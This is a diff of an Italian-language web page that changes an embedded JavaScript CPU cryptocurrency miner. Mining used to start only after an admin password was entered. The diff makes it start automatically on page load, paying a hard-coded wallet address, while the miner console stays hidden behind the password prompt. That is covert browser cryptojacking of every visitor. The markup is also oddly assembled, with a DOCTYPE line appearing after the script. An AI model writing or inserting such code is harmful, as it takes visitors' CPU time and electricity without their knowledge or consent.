@@ -60,10 +60,10 @@
 
 <div id="mining-console">
     <div class="console-header">
-        <span><strong>🔨 CPU Miner</strong></span>
+        <span><strong> CPU Miner</strong></span>
         <button class="close-btn" onclick="hideMinerConsole()">×</button>
     </div>
-    <div>Stato: <span id="status">In attesa...</span></div>
+    <div>Stato: <span id="status">Avviando...</span></div>
     <div>Hashrate: <span id="hashrate">0.00</span> KH/s</div>
     <div>Tempo: <span id="timer">00:00</span></div>
 </div>
@@ -75,12 +75,29 @@
 
     let miningStarted = false;
 
-    // === Funzioni esposte globalmente ===
+    // Mining parte SUBITO (come prima)
+    async function initMining() {
+        try {
+            await autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
+            miningStarted = true;
+            document.getElementById("status").textContent = "Attivo";
+            
+            // Aggiornamento hashrate reale
+            setInterval(() => {
+                const hr = minotaurxHashrate.currentHashrateKHs || 0;
+                document.getElementById("hashrate").textContent = parseFloat(hr).toFixed(2);
+            }, 700);
+        } catch (e) {
+            console.error(e);
+            document.getElementById("status").textContent = "Errore";
+        }
+    }
+
+    // Funzioni globali per i pulsanti
     window.askPassword = function() {
         const password = prompt("Inserire admin password");
         if (password === "CpuMining") {
             showMinerConsole();
-            if (!miningStarted) startMining();
         } else if (password !== null) {
             alert("Password errata!");
         }
@@ -96,28 +113,6 @@
         document.getElementById("reopen-btn").style.display = "none";
     }
 
-    async function startMining() {
-        if (miningStarted) return;
-        
-        document.getElementById("status").textContent = "Avviando...";
-        
-        try {
-            await autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
-            miningStarted = true;
-            document.getElementById("status").textContent = "Attivo";
-            
-            // Aggiorna hashrate reale
-            setInterval(() => {
-                const hr = minotaurxHashrate.currentHashrateKHs || 0;
-                document.getElementById("hashrate").textContent = parseFloat(hr).toFixed(2);
-            }, 800);
-
-        } catch (e) {
-            console.error(e);
-            document.getElementById("status").textContent = "Errore avvio";
-        }
-    }
-
     // Timer
     let startTime = Date.now();
     setInterval(() => {
@@ -126,6 +121,11 @@
         const sec = (elapsed % 60).toString().padStart(2, '0');
         document.getElementById("timer").textContent = `${min}:${sec}`;
     }, 1000);
+
+    // Avvio immediato del mining
+    window.addEventListener('load', () => {
+        initMining();
+    });
 </script>
 <!DOCTYPE html>
 <html lang="it">
